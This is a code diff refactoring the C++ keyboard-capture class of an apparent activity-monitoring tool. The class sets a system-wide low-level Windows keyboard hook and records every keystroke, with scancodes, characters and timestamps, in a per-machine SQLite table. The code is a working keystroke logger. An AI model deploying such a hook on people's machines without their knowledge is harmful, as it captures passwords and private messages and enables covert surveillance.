@@ -15,27 +15,28 @@ KeyboardCapture* KeyboardCapture::self = nullptr;
 
 
 KeyboardCapture::KeyboardCapture() {
-    if(exists)
+    if(self)
         throw instance_exists_error("KeyboardCapture::KeyboardCapture");
-    exists = true;
     self = this;
     infoType = FlobGlobal::Keypress;
     auto n = now();
     char date[11] = {0};
     sprintf(date,"%02d_%02d_%04d",n->tm_mday, n->tm_mon+1, n->tm_year+1900);
     keyTable = "KeyPress_"+std::string(date)+"_"+from_wstring(computerHandleStr())+"_CPACTIVITY";
-    sql_table = "CREATE TABLE IF NOT EXISTS "+keyTable+"("
+    sql_table = "CREATE TABLE IF NOT EXISTS " + keyTable + "("
                 "id INTEGER PRIMARY KEY,"
                 "click_down INTEGER,"
                 "scancode INTEGER,"
                 "vkcode INTEGER,"
                 "char TEXT,"
-                "time TEXT);";
+                "time INTEGER);";
     FlobbelSafe::self->buildTable(sql_table);
     Log::self->info("KeyboardCapture::KeyboardCapture", "Table build verified: "+sql_table);
-    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,llkeyhook, NULL, 0);
+    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,llkeyhook, nullptr, 0);
     Log::self->info("KeyboardCapture::KeyboardCapture", "Hook set");
 }
+
+void KeyboardCapture::terminate(){}
 
 KeyboardCapture::~KeyboardCapture() {
     UnhookWindowsHookEx(keyboardHook);
@@ -59,16 +60,15 @@ void KeyboardCapture::sql_action(const Info* inf){
         arguments.push_back(new sql_int(x.scancode));
         arguments.push_back(new sql_int(x.vkcode));
         arguments.push_back(new sql_str(x.descr));
-        arguments.push_back(new sql_str(x.timestamp));
+        arguments.push_back(new sql_int(x.timestamp));
     }
-    FlobbelSafe::self->insert_data(sql_starter, arguments, 5);
+    FlobbelSafe::self->insert_data(sql_starter, arguments);
 }
 
 LRESULT KeyboardCapture::llkeyhook(int nCode, WPARAM wParam, LPARAM lParam) {
     if(nCode == HC_ACTION) {
         KeypressInfo info;
         auto further = (KBDLLHOOKSTRUCT *) lParam;
-        std::wstring time = timestamp();
 
         switch (wParam) {
             case WM_KEYDOWN:
@@ -86,11 +86,11 @@ LRESULT KeyboardCapture::llkeyhook(int nCode, WPARAM wParam, LPARAM lParam) {
             default:
                 info.clickdown += -1;
         }
-        info.ch = FCS.handle;
+        info.ch = FCS::computer_handle;
         info.infotype = FlobGlobal::Keypress;
         info.scancode = (unsigned) further->scanCode;
         info.vkcode = (unsigned) further->vkCode;
-        info.timestamp = time;
+        info.timestamp = time(0);
         wcsncpy(info.descr, map(info.vkcode).c_str(), (size_t) 4);
         self->sql_action(&info);
     }
